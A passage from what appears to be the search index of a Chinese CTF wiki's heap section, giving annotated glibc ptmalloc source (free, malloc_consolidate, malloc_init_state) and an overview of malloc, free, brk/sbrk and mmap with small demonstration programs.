chunk-\u524d\u5411\u5408\u5e76-\u5408\u5e76\u9ad8\u5730\u5740chunk"},{"location":"pwn/heap/heap_implementation_details/#top-chunk-top-chunk","text":"/* If the chunk borders the current high end of memory, consolidate into top */ // \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk else { size += nextsize ; set_head ( p , size | PREV_INUSE ); av -> top = p ; check_chunk ( av , p ); }","title":"\u4e0b\u4e00\u5757\u662ftop chunk-\u5408\u5e76\u5230top chunk"},{"location":"pwn/heap/heap_implementation_details/#_14","text":"/* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD // \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002 // \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 if (( unsigned long ) ( size ) >= FASTBIN_CONSOLIDATION_THRESHOLD ) { // \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76 if ( have_fastchunks ( av )) malloc_consolidate ( av ); // \u4e3b\u5206\u914d\u533a if ( av == & main_arena ) { #ifndef MORECORE_CANNOT_TRIM // top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c if (( unsigned long ) ( chunksize ( av -> top )) >= ( unsigned long ) ( mp_ . trim_threshold )) systrim ( mp_ . top_pad , av ); #endif // \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info * heap = heap_for_ptr ( top ( av )); assert ( heap -> ar_ptr == av ); heap_trim ( heap , mp_ . top_pad ); } } if ( ! have_lock ) { assert ( locked ); __libc_lock_unlock ( av -> mutex ); }","title":"\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58"},{"location":"pwn/heap/heap_implementation_details/#mmapchunk","text":"} else { // If the chunk was allocated via mmap, release via munmap(). munmap_chunk ( p ); }","title":"\u91ca\u653emmap\u7684chunk"},{"location":"pwn/heap/heap_implementation_details/#systrim","text":"","title":"systrim"},{"location":"pwn/heap/heap_implementation_details/#heap_trim","text":"","title":"heap_trim"},{"location":"pwn/heap/heap_implementation_details/#munmap_chunk","text":"","title":"munmap_chunk"},{"location":"pwn/heap/heap_implementation_details/#_15","text":"","title":"\u5220\u9664\u5806"},{"location":"pwn/heap/heap_implementation_details/#malloc_state","text":"","title":"malloc_state \u76f8\u5173\u51fd\u6570"},{"location":"pwn/heap/heap_implementation_details/#malloc_init_state","text":"/* Initialize a malloc_state struct. This is called only from within malloc_consolidate, which needs be called in the same contexts anyway. It is never called directly outside of malloc_consolidate because some optimizing compilers try to inline it at all call points, which turns out not to be an optimization at all. (Inlining it in malloc_consolidate is fine though.) */ static void malloc_init_state ( mstate av ) { int i ; mbinptr bin ; /* Establish circular links for normal bins */ for ( i = 1 ; i < NBINS ; ++ i ) { bin = bin_at ( av , i ); bin -> fd = bin -> bk = bin ; } #if MORECORE_CONTIGUOUS if ( av != & main_arena ) #endif set_noncontiguous ( av ); if ( av == & main_arena ) set_max_fast ( DEFAULT_MXFAST ); // \u8bbe\u7f6e flags \u6807\u8bb0\u76ee\u524d\u6ca1\u6709fast chunk av -> flags |= FASTCHUNKS_BIT ; // \u5c31\u662f unsorted bin av -> top = initial_top ( av ); }","title":"malloc_init_state"},{"location":"pwn/heap/heap_implementation_details/#malloc_consolidate","text":"\u8be5\u51fd\u6570\u4e3b\u8981\u6709\u4e24\u4e2a\u529f\u80fd \u82e5 fastbin \u672a\u521d\u59cb\u5316\uff0c\u5373 global_max_fast \u4e3a0\uff0c\u90a3\u5c31\u521d\u59cb\u5316 malloc_state\u3002 \u5982\u679c\u5df2\u7ecf\u521d\u59cb\u5316\u7684\u8bdd\uff0c\u5c31\u5408\u5e76 fastbin \u4e2d\u7684 chunk\u3002 \u57fa\u672c\u7684\u6d41\u7a0b\u5982\u4e0b","title":"malloc_consolidate"},{"location":"pwn/heap/heap_implementation_details/#_16","text":"static void malloc_consolidate ( mstate av ) { mfastbinptr * fb ; /* current fastbin being consolidated */ mfastbinptr * maxfb ; /* last fastbin (for loop control) */ mchunkptr p ; /* current chunk being consolidated */ mchunkptr nextp ; /* next chunk to consolidate */ mchunkptr unsorted_bin ; /* bin header */ mchunkptr first_unsorted ; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk ; INTERNAL_SIZE_T size ; INTERNAL_SIZE_T nextsize ; INTERNAL_SIZE_T prevsize ; int nextinuse ; mchunkptr bck ; mchunkptr fwd ;","title":"\u521d\u59cb"},{"location":"pwn/heap/heap_implementation_details/#chunk_3","text":"/* If max_fast is 0, we know that av hasn't yet been initialized, in which case do so below */ // \u8bf4\u660e fastbin \u5df2\u7ecf\u521d\u59cb\u5316 if ( get_max_fast () != 0 ) { // \u6e05\u7a7a fastbin \u6807\u8bb0 // \u56e0\u4e3a\u8981\u5408\u5e76 fastbin \u4e2d\u7684 chunk \u4e86\u3002 clear_fastchunks ( av ); // unsorted_bin = unsorted_chunks ( av ); /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren't immediately going to be reused anyway. */ // \u6309\u7167 fd \u987a\u5e8f\u904d\u5386 fastbin \u7684\u6bcf\u4e00\u4e2a bin\uff0c\u5c06 bin \u4e2d\u7684\u6bcf\u4e00\u4e2a chunk \u5408\u5e76\u6389\u3002 maxfb = & fastbin ( av , NFASTBINS - 1 ); fb = & fastbin ( av , 0 ); do { p = atomic_exchange_acq ( fb , NULL ); if ( p != 0 ) { do { check_inuse_chunk ( av , p ); nextp = p -> fd ; /* Slightly streamlined version of consolidation code in * free() */ size = chunksize ( p ); nextchunk = chunk_at_offset ( p , size ); nextsize = chunksize ( nextchunk ); if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); } if ( nextchunk != av -> top ) { // \u5224\u65ad nextchunk \u662f\u5426\u662f\u7a7a\u95f2\u7684\u3002 nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); if ( ! nextinuse ) { size += nextsize ; unlink ( av , nextchunk , bck , fwd ); } else // \u8bbe\u7f6e nextchunk \u7684 prev inuse \u4e3a0\uff0c\u4ee5\u8868\u660e\u53ef\u4ee5\u5408\u5e76\u5f53\u524d fast chunk\u3002 clear_inuse_bit_at_offset ( nextchunk , 0 ); first_unsorted = unsorted_bin -> fd ; unsorted_bin -> fd = p ; first_unsorted -> bk = p ; if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } set_head ( p , size | PREV_INUSE ); p -> bk = unsorted_bin ; p -> fd = first_unsorted ; set_foot ( p , size ); } else { size += nextsize ; set_head ( p , size | PREV_INUSE ); av -> top = p ; } } while (( p = nextp ) != 0 ); } } while ( fb ++ != maxfb );","title":"\u5408\u5e76 chunk"},{"location":"pwn/heap/heap_implementation_details/#_17","text":"\u8bf4\u660e fastbin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 } else { malloc_init_state ( av ); // \u5728\u975e\u8c03\u8bd5\u60c5\u51b5\u4e0b\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u5728\u8c03\u8bd5\u60c5\u51b5\u4e0b\uff0c\u505a\u4e00\u4e9b\u68c0\u6d4b\u3002 check_malloc_state ( av ); }","title":"\u521d\u59cb\u5316"},{"location":"pwn/heap/heap_implementation_details/#_18","text":"\u4e0b\u9762\u7684\u4ee3\u7801\u7528\u4e8e\u652f\u6301\u6d4b\u8bd5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b perturb_byte \u662f0\u3002 static int perturb_byte ; static void alloc_perturb ( char * p , size_t n ) { if ( __glibc_unlikely ( perturb_byte )) memset ( p , perturb_byte ^ 0xff , n ); } static void free_perturb ( char * p , size_t n ) { if ( __glibc_unlikely ( perturb_byte )) memset ( p , perturb_byte , n ); }","title":"\u6d4b\u8bd5\u652f\u6301"},{"location":"pwn/heap/heap_overview/","text":"\u5806\u6982\u8ff0 \u00b6 \u4ec0\u4e48\u662f\u5806 \u00b6 \u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58\uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58\u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002 \u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c \u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c\u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002 \u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002 Linux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea \u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f15\u8d77\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86ptmalloc2\u3002 \u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux\u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c \u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb \u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002 \u5806\u7684\u57fa\u672c\u64cd\u4f5c \u00b6 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd \u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528 \u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002 malloc \u00b6 \u5728 glibc \u7684 malloc.h \u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ \u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684\u6307\u9488\u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002 \u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c size_t \u662f\u65e0\u7b26\u53f7\u6570\uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09 \uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5d29\u6e83\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002 free \u00b6 \u5728 glibc \u7684 malloc.h \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ \u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002 \u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002 \u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f double free \u3002 \u9664\u4e86\u88ab\u7981\u7528 (mallopt) \u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002 \u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528 \u00b6 \u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f (s)brk \u51fd\u6570\u4ee5\u53ca mmap, munmap \u51fd\u6570\u3002 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002 (s)brk \u00b6 \u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk (program break location, the program break is the address of the first location beyond the current end of the data region, https://en.wikipedia.org/wiki/Sbrk)\u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58 \u3002 \u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740 start_brk \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e brk \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542fASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c \u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002 \u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002 \u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a \u4f8b\u5b50 /* sbrk and brk example */ ##include <stdio.h> ##include <unistd.h> ##include <sys/types.h> int main () { void * curr_brk , * tmp_brk = NULL ; printf ( \"Welcome to sbrk example:%d \\n \" , getpid ()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk ( 0 ); printf ( \"Program Break Location1:%p \\n \" , curr_brk ); getchar (); /* brk(addr) increments/decrements program break location */ brk ( curr_brk + 4096 ); curr_brk = sbrk ( 0 ); printf ( \"Program break Location2:%p \\n \" , curr_brk ); getchar (); brk ( tmp_brk ); curr_brk = sbrk ( 0 ); printf ( \"Program Break Location3:%p \\n \" , curr_brk ); getchar (); return 0 ; } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86getchar()\u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002 \u5728\u7b2c\u4e00\u6b21\u8c03\u7528brk\u4e4b\u524d \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64 start_brk = brk = end_data = 0x804b000 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141 Program Break Location1:0x804b000 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps ... 0804a000-0804b000 rw-p 00001000 08 :01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ \u7b2c\u4e00\u6b21\u589e\u52a0brk\u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5 start_brk = end_data = 0x804b000 brk = 0x804c000 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141 Program Break Location1:0x804b000 Program Break Location2:0x804c000 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps ... 0804a000-0804b000 rw-p 00001000 08 :01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk 0804b000-0804c000 rw-p 00000000 00 :00 0 [ heap ] b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ \u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c 0x0804b000 \u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740 rw-p\u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002 00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002 00:00 \u662f\u4e3b\u4ece(Major/mirror)\u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a0\u3002 0\u8868\u793a\u7740Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002 mmap \u00b6 malloc \u4f1a\u4f7f\u7528 mmap \u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee50\u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002 \u4f8b\u5b50 /* Private anonymous mapping example using mmap syscall */ ##include <stdio.h> ##include <sys/mman.h> ##include <sys/types.h> ##include <sys/stat.h> ##include <fcntl.h> ##include <unistd.h> ##include <stdlib.h> void static inline errExit ( const char * msg ) { printf ( \"%s failed. Exiting the process \\n \" , msg ); exit ( - 1 ); } int main () { int ret = - 1 ; printf ( \"Welcome to private anonymous mapping example::PID:%d \\n \" , getpid ()); printf ( \"Before mmap \\n \" ); getchar (); char * addr = NULL ; addr = mmap ( NULL , ( size_t ) 132 * 1024 , PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS , - 1 , 0 ); if ( addr == MAP_FAILED ) errExit ( \"mmap\" ); printf ( \"After mmap \\n \" ); getchar (); /* Unmap mapped region. */ ret = munmap ( addr , ( size_t ) 132 * 1024 ); if ( ret == - 1 ) errExit ( \"munmap\" ); printf ( \"After munmap \\n \" ); getchar (); return 0 ; } \u5728\u6267\u884cmmap\u4e4b\u524d \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709.so\u6587\u4ef6\u7684mmap\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ mmap\u540e 